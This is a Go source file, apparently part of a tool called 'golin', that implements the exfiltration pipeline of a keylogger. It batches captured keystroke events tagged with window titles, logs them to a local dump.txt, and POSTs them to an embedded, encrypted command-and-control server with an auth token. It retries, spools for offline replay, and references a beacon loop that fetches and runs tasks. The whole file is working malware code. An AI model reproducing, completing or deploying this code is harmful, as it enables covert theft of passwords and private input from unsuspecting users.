package cmd

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golin/c2config"
	"golin/c2secret"
)

// 上报相关参数:C2 服务端地址与令牌均内置(见 c2secret 包),不再由命令行指定
var (
	serverURL      = c2secret.ServerURL() // C2 服务器地址(内置)
	reportInterval int                    // 上报时间间隔(秒)
	reportBatch    int                    // 上报事件数阈值
)

func init() {
	keylogger.Flags().IntVar(&reportInterval, "interval", 30, "上报时间间隔(秒)")
	keylogger.Flags().IntVar(&reportBatch, "batch", 100, "攒够多少条事件强制上报")
}

// 客户端内置的 C2 常量(密态存储,运行时解密),与 c2config 包保持一致,
// 一致性由 TestC2ConstsMatch 与 c2secret 包测试共同守护
var (
	c2Token  = c2secret.Token()
	c2Header = c2secret.HeaderName()
	c2Report = c2secret.ReportPath()
)

// eventCh 是所有事件的生产消费通道,生产者(钩子回调等)非阻塞推送,绝不影响钩子线程
var eventCh = make(chan c2config.Event, 4096)

var (
	titleMu      sync.Mutex
	currentTitle string // 当前前台窗口标题
	clientID     string // 主机名-用户名
	spoolMu      sync.Mutex
	stopCh       = make(chan struct{})
	stopOnce     sync.Once
	repWg        sync.WaitGroup
)

// pushEvent 向通道推送一条事件,通道满则丢弃(兜底保护,正常不会发生)
func pushEvent(typ, data string) {
	titleMu.Lock()
	win := currentTitle
	titleMu.Unlock()
	ev := c2config.Event{Time: time.Now().Unix(), Type: typ, Win: win, Data: data}
	select {
	case eventCh <- ev:
	default:
	}
}

// setWindowTitle 由窗口标题监控 goroutine 在标题变化时调用
func setWindowTitle(t string) {
	titleMu.Lock()
	currentTitle = t
	titleMu.Unlock()
}

// dataDirFn 返回日志落盘目录(用户主目录下 Golin 目录),测试时可替换
var dataDirFn = func() string {
	usr, err := user.Current()
	if err != nil {
		return "Golin"
	}
	return filepath.Join(usr.HomeDir, "Golin")
}

// startReporter 启动上报管道:本地写盘 goroutine + 离线补传,需在钩子安装前调用
func startReporter() {
	host, _ := os.Hostname()
	uname := ""
	if u, err := user.Current(); err == nil {
		uname = u.Username
	}
	clientID = host + "-" + uname

	if reportInterval <= 0 {
		reportInterval = 30
	}
	if reportBatch <= 0 {
		reportBatch = 100
	}
	if serverURL != "" {
		serverURL = strings.TrimRight(serverURL, "/")
		if !strings.HasPrefix(serverURL, "http://") && !strings.HasPrefix(serverURL, "https://") {
			serverURL = "http://" + serverURL
		}
		go replaySpool() // 补传上次离线期间落盘的数据
		repWg.Add(1)
		go func() {
			defer repWg.Done()
			beaconLoop() // 心跳 + 任务拉取执行
		}()
	}
	repWg.Add(1)
	go func() {
		defer repWg.Done()
		pipeline()
	}()
}

// stopReporter 停止上报管道并等待退出,主要用于测试;正式运行随进程退出
func stopReporter() {
	stopOnce.Do(func() { close(stopCh) })
	repWg.Wait()
	// 重置通道与 Once,允许再次启动(测试需要)
	stopCh = make(chan struct{})
	stopOnce = sync.Once{}
}

// pipeline 唯一的事件消费者:写本地 dump.txt,同时攒批次交给上报
func pipeline() {
	f := openLocalFile()
	if f != nil {
		defer func() { _ = f.Close() }()
	}
	var batch []c2config.Event
	ticker := time.NewTicker(time.Duration(reportInterval) * time.Second)
	defer ticker.Stop()

	flush := func() {
		if len(batch) == 0 {
			return
		}
		toSend := batch
		batch = nil
		if serverURL != "" {
			go sendBatch(toSend)
		}
	}

	for {
		select {
		case ev := <-eventCh:
			writeLocal(f, ev)
			if serverURL != "" {
				batch = append(batch, ev)
				if len(batch) >= reportBatch {
					flush()
				}
			}
		case <-ticker.C:
			flush()
		case <-stopCh:
			flush()
			return
		}
	}
}

// openLocalFile 打开(或创建)本地 dump.txt,失败返回 nil,本地写盘静默降级
func openLocalFile() *os.File {
	dir := dataDirFn()
	if err := os.MkdirAll(dir, 0777); err != nil {
		return nil
	}
	f, err := os.OpenFile(filepath.Join(dir, "dump.txt"), os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return nil
	}
	srv := serverURL
	if srv == "" {
		srv = "local"
	}
	fmt.Fprintf(f, "===== 会话开始 %s  client=%s  server=%s =====\n",
		time.Now().Format("2006-01-02 15:04:05"), clientID, srv)
	return f
}

// writeLocal 写一条事件到本地文件,格式与旧版 dump.txt 类似但带事件类型
func writeLocal(f *os.File, ev c2config.Event) {
	if f == nil {
		return
	}
	t := time.Unix(ev.Time, 0).Format("2006-01-02 15:04:05")
	if ev.Win != "" {
		fmt.Fprintf(f, "%s [%s][%s] %s\n", t, ev.Type, ev.Win, ev.Data)
	} else {
		fmt.Fprintf(f, "%s [%s] %s\n", t, ev.Type, ev.Data)
	}
}

// sendBatch 发送一个批次,失败按 2s/4s 退避重试,最终失败落盘 spool 待补传
func sendBatch(events []c2config.Event) {
	data, err := json.Marshal(c2config.Batch{ClientID: clientID, Events: events})
	if err != nil {
		return
	}
	delays := []time.Duration{0, 2 * time.Second, 4 * time.Second}
	for i, d := range delays {
		if i > 0 {
			time.Sleep(d)
		}
		if postBatch(data) == nil {
			return
		}
	}
	spoolAppend(data)
}

// postBatch 单次 HTTP 上报
func postBatch(data []byte) error {
	req, err := http.NewRequest("POST", serverURL+c2Report, bytes.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set(c2Header, c2Token)
	resp, err := c2HTTP.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("http status %d", resp.StatusCode)
	}
	return nil
}

// spoolPath 离线队列文件路径
func spoolPath() string {
	return filepath.Join(dataDirFn(), "spool.jsonl")
}

// spoolAppend 将一个批次追加到离线队列
func spoolAppend(data []byte) {
	spoolMu.Lock()
	defer spoolMu.Unlock()
	f, err := os.OpenFile(spoolPath(), os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer func() { _ = f.Close() }()
	_, _ = f.Write(append(data, '\n'))
}

// replaySpool 启动时补传离线队列,发送成功的行移除,失败的行保留
func replaySpool() {
	spoolMu.Lock()
	defer spoolMu.Unlock()
	data, err := os.ReadFile(spoolPath())
	if err != nil || len(data) == 0 {
		return
	}
	var remain []string
	for _, ln := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if ln == "" {
			continue
		}
		if postBatch([]byte(ln)) != nil {
			remain = append(remain, ln)
		}
	}
	if len(remain) == 0 {
		os.Remove(spoolPath())
		return
	}
	os.WriteFile(spoolPath(), []byte(strings.Join(remain, "\n")+"\n"), 0644)
}
